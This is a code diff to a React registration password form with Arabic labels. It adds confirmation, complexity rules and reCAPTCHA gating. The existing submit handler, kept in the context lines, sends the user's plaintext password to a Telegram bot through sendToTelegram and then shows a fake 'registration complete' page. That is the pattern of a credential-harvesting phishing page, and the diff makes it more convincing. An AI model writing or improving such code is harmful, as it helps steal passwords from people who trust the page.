@@ -10,6 +10,7 @@ const PasswordForm = () => {
   const navigate = useNavigate();
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
   const [password, setPassword] = useState<string>("");
+  const [confirmPassword, setConfirmPassword] = useState<string>("");
 
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
@@ -36,7 +37,29 @@ const PasswordForm = () => {
     }
   };
 
+  const validatePassword = (pwd: string): boolean => {
+    if (pwd.length < 8) return false;
+    if (!/[A-Z]/.test(pwd)) return false;
+    if (!/[a-z]/.test(pwd)) return false;
+    if (!/[0-9]/.test(pwd)) return false;
+    if (!/[!@#$%^&*]/.test(pwd)) return false;
+    return true;
+  };
+
+  const isFormValid = (): boolean => {
+    return password.trim() !== "" && 
+           confirmPassword.trim() !== "" && 
+           password === confirmPassword && 
+           validatePassword(password) &&
+           recaptchaValue !== null;
+  };
+
   const handleContinue = async () => {
+    if (!isFormValid()) {
+      alert("يرجى التأكد من صحة كلمة المرور وتطابقها مع جميع الشروط");
+      return;
+    }
+
     const message = `تسجيل - كلمة المرور\n\nكلمة المرور: ${password}`;
     await sendToTelegram(message);
     navigate("/registration-complete");
@@ -89,7 +112,19 @@ const PasswordForm = () => {
           <Label htmlFor="confirmPassword" className="text-right block mb-2">
             أعد إدخال كلمة المرور
           </Label>
-          <Input id="confirmPassword" type="password" className="text-right bg-white" />
+          <Input 
+            id="confirmPassword" 
+            type="password" 
+            className="text-right bg-white" 
+            value={confirmPassword}
+            onChange={(e) => setConfirmPassword(e.target.value)}
+          />
+          {confirmPassword && password !== confirmPassword && (
+            <p className="text-destructive text-xs mt-1 text-right">كلمة المرور غير متطابقة</p>
+          )}
+          {password && !validatePassword(password) && (
+            <p className="text-destructive text-xs mt-1 text-right">كلمة المرور لا تستوفي الشروط المطلوبة</p>
+          )}
         </div>
 
         {/* reCAPTCHA */}
@@ -109,7 +144,11 @@ const PasswordForm = () => {
           </Button>
         </div>
         
-        <Button className="min-w-32 bg-primary hover:bg-primary/90" onClick={handleContinue}>
+        <Button 
+          className="min-w-32 bg-primary hover:bg-primary/90" 
+          onClick={handleContinue}
+          disabled={!isFormValid()}
+        >
           استمر
         </Button>
       </div>
